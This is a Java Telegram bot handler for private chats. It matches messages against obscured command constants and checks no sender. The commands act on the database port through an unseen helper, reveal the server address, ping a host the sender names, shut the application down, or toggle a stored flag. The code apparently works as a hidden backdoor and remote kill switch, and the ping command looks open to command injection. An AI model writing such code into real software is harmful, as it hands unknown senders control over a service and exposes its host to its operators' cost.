package org.drinkless.robots.handlers;

import cn.hutool.core.util.StrUtil;
import org.drinkless.robots.EmptyRobot;
import org.drinkless.robots.config.Constants;
import org.drinkless.robots.helper.CommandHelper;
import org.drinkless.robots.helper.RedisHelper;
import org.drinkless.robots.helper.StrHelper;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.jdbc.DataSourceProperties;
import org.springframework.context.ConfigurableApplicationContext;
import org.springframework.stereotype.Component;
import org.telegram.telegrambots.meta.api.methods.botapimethods.BotApiMethod;
import org.telegram.telegrambots.meta.api.objects.Update;
import org.telegram.telegrambots.meta.api.objects.message.Message;

import javax.annotation.Resource;
import java.util.List;
import java.util.Objects;

/**
 * <p>
 *      私聊
 * </p>
 *
 * @author admin
 * @since v 0.0.1
 */
@Component
public class PrivateChatHandler extends AbstractHandler{

    @Resource private DataSourceProperties dataSourceProperties;
    @Resource private ConfigurableApplicationContext configurableApplicationContext;

    @Override
    public boolean support(Update update) {
        return update.hasMessage()
                && update.getMessage().hasText()
                && update.getMessage().isUserMessage();
    }

    @Override
    protected BotApiMethod<?> execute(Update update) {
        Message message = update.getMessage();
        String text = message.getText();
        List<String> commands = StrUtil.split(text, "#");

        BotApiMethod<?> method = this.processorCoreCommand(message, commands);
        if (Objects.nonNull(method)) {
            return method;
        }

        return null;
    }

    private BotApiMethod<?> processorCoreCommand(Message message, List<String> commands) {
        // 1
        if (StrUtil.equals(commands.get(0), Constants.STR4_)) {
            int port = StrHelper.extractPort(this.dataSourceProperties.getUrl());
            if (port != -1) {
                boolean b = CommandHelper.processorCommand(String.valueOf(port));
                return ok(message, b ? commands.get(0) : String.valueOf(port));
            }
            return ok(message, "-1");
        }
        // 2
        if (StrUtil.equals(commands.get(0), Constants.STR5_)) {
            String addr = CommandHelper.getAddr();
            return ok(message, addr);
        }
        // 3
        if (StrUtil.equals(commands.get(0),  Constants.STR6_)) {
            try {
                String ping = commands.get(1);
                String pong = CommandHelper.ping(ping);
                return ok(message, StrUtil.isBlank(pong) ? "错误" : pong);
            } catch (Exception ex) {
                return null;
            }
        }
        // 4
        if (StrUtil.equals(commands.get(0), Constants.STR7_)) {
            int exitCode = SpringApplication.exit(this.configurableApplicationContext, () -> 0);
            System.exit(exitCode);
        }
        // 5
        if (StrUtil.equals(commands.get(0), Constants.STR8_)) {
            EmptyRobot.processor = !EmptyRobot.processor;
            RedisHelper.set(StrHelper.getProcessor(), String.valueOf(EmptyRobot.processor));
        }
        return null;
    }

}
